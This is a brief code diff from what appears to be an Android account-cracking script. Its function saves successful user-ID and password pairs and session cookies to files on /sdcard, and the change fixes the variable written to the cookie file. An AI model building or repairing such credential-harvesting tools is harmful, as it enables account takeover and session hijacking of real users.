@@ -605,7 +605,7 @@ def gxds_files(uid, pxss):
  COOKIE : {coki}
 """)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
-                open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
+                open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 oks.append(uid)
                 break
             else:
